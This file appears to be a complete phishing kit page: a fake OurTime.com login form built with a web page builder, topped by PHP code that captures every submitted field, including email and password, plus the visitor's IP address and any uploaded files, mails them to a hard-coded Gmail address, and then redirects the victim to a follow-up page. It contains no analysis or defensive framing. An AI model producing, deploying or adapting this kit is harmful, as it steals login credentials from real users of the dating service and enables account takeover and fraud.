<?php
function ValidateEmail($email)
{
   $pattern = '/^([0-9a-z]([-.\w]*[0-9a-z])*@(([0-9a-z])+([-\w]*[0-9a-z])*\.)+[a-z]{2,6})$/i';
   return preg_match($pattern, $email);
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['formid']) && $_POST['formid'] == 'loginform')
{
   $mailto = 'richardsnow1234@gmail.com';
   $mailfrom = isset($_POST['email']) ? $_POST['email'] : $mailto;
   $subject = 'ourtime rusalt - Login';
   $message = 'https://www.ourtime.com/
Email Login:
';
   $success_url = './inform.php';
   $error_url = '';
   $error = '';
   $eol = "\n";
   $boundary = md5(uniqid(time()));

   $header  = 'From: '.$mailfrom.$eol;
   $header .= 'Reply-To: '.$mailfrom.$eol;
   $header .= 'MIME-Version: 1.0'.$eol;
   $header .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'.$eol;
   $header .= 'X-Mailer: PHP v'.phpversion().$eol;
   if (!ValidateEmail($mailfrom))
   {
      $error .= "The specified email address is invalid!\n<br>";
   }

   if (!empty($error))
   {
      $errorcode = file_get_contents($error_url);
      $replace = "##error##";
      $errorcode = str_replace($replace, $error, $errorcode);
      echo $errorcode;
      exit;
   }

   $internalfields = array ("submit", "reset", "send", "filesize", "formid", "captcha_code", "recaptcha_challenge_field", "recaptcha_response_field", "g-recaptcha-response");
   $message .= $eol;
   $message .= "IP Address : ";
   $message .= $_SERVER['REMOTE_ADDR'];
   $message .= $eol;
   $logdata = '';
   foreach ($_POST as $key => $value)
   {
      if (!in_array(strtolower($key), $internalfields))
      {
         if (!is_array($value))
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . $value . $eol;
         }
         else
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . implode(",", $value) . $eol;
         }
      }
   }
   $body  = 'This is a multi-part message in MIME format.'.$eol.$eol;
   $body .= '--'.$boundary.$eol;
   $body .= 'Content-Type: text/plain; charset=ISO-8859-1'.$eol;
   $body .= 'Content-Transfer-Encoding: 8bit'.$eol;
   $body .= $eol.stripslashes($message).$eol;
   if (!empty($_FILES))
   {
       foreach ($_FILES as $key => $value)
       {
          if ($_FILES[$key]['error'] == 0)
          {
             $body .= '--'.$boundary.$eol;
             $body .= 'Content-Type: '.$_FILES[$key]['type'].'; name='.$_FILES[$key]['name'].$eol;
             $body .= 'Content-Transfer-Encoding: base64'.$eol;
             $body .= 'Content-Disposition: attachment; filename='.$_FILES[$key]['name'].$eol;
             $body .= $eol.chunk_split(base64_encode(file_get_contents($_FILES[$key]['tmp_name']))).$eol;
          }
      }
   }
   $body .= '--'.$boundary.'--'.$eol;
   if ($mailto != '')
   {
      mail($mailto, $subject, $body, $header);
   }
   header('Location: '.$success_url);
   exit;
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>ourtime.com The 50+ Single Network</title>
<meta name="generator" content="WYSIWYG Web Builder 14 Trial Version - http://www.wysiwygwebbuilder.com">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://pmi.peoplemedia.com/pmicontent/166/images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="https://pmi.peoplemedia.com/pmicontent/166/images/favicon.ico" rel="apple-touch-icon" sizes="">
<link href="our.css" rel="stylesheet">
<link href="index.css" rel="stylesheet">
</head>
<body>
<div id="wb_LayoutGrid1">
<div id="LayoutGrid1">
<div class="row">
<div class="col-1">
</div>
<div class="col-2">
<hr id="Lin33" style="display:block;width: 100%;z-index:0;">
<div id="wb_Image1" style="display:inline-block;width:201px;height:56px;z-index:1;">
<img src="images/logo.png" id="Image1" alt="">
</div>
<hr id="Line1" style="display:block;width: 100%;z-index:2;">
</div>
<div class="col-3">
<hr id="Littt" style="display:block;width: 100%;z-index:3;">
<div id="wb_Image2" style="display:inline-block;width:119px;height:24px;z-index:4;">
<img src="images/Apeople.png" id="Image2" alt="">
</div>
</div>
</div>
</div>
</div>
<div id="wb_loginform" style="position:absolute;left:81px;top:110px;width:848px;height:294px;z-index:23;">
<form name="loginform" method="post" action="<?php echo basename(__FILE__); ?>" enctype="multipart/form-data" id="loginform">
<input type="hidden" name="formid" value="loginform">
<div id="Layer1" style="position:absolute;text-align:left;left:536px;top:66px;width:312px;height:189px;z-index:8;">
<div id="wb_Image4" style="position:absolute;left:26px;top:34px;width:127px;height:34px;z-index:5;">
<img src="images/join.png" id="Image4" alt=""></div>
<div id="wb_Image3" style="position:absolute;left:33px;top:121px;width:120px;height:36px;z-index:6;">
<img src="images/forget.png" id="Image3" alt=""></div>
<hr id="Line2" style="position:absolute;left:33px;top:94px;width:279px;z-index:7;">
</div>
<div id="wb_Image8" style="position:absolute;left:49px;top:20px;width:234px;height:28px;z-index:9;">
<img src="images/login.png" id="Image8" alt=""></div>
<div id="wb_Image7" style="position:absolute;left:62px;top:72px;width:39px;height:15px;z-index:10;">
<img src="images/email.png" id="Image7" alt=""></div>
<input type="email" id="email-login" style="position:absolute;left:147px;top:67px;width:207px;height:17px;z-index:11;" name="email address" value="" spellcheck="false" required>
<div id="wb_Image5" style="position:absolute;left:51px;top:124px;width:61px;height:17px;z-index:12;">
<img src="images/pass.png" id="Image5" alt=""></div>
<input type="password" id="pass" style="position:absolute;left:147px;top:119px;width:207px;height:17px;z-index:13;" name="Password" value="" spellcheck="false" required>
<div id="wb_Image6" style="position:absolute;left:175px;top:170px;width:86px;height:16px;z-index:14;">
<img src="images/rember.png" id="Image6" alt=""></div>
<div id="wb_select" style="position:absolute;left:148px;top:169px;width:15px;height:15px;z-index:15;">
<input type="checkbox" id="select" name="Checkbox1" value="on" style="position:absolute;left:0;top:0;"><label for="select"></label></div>
<input type="submit" id="login-btn" name="login" value="" style="position:absolute;left:147px;top:205px;width:59px;height:29px;z-index:16;">
</form>
</div>
<div id="Layer2" style="position:absolute;text-align:left;left:0px;top:456px;width:1263px;height:72px;z-index:24;">
<div id="wb_Image9" style="position:absolute;left:77px;top:16px;width:606px;height:22px;z-index:20;">
<img src="images/166.png" id="Image9" alt=""></div>
</div>
<div id="wb_Image10" style="position:absolute;left:257px;top:538px;width:767px;height:35px;z-index:25;">
<img src="images/home.png" id="Image10" alt=""></div>
</body>
</html>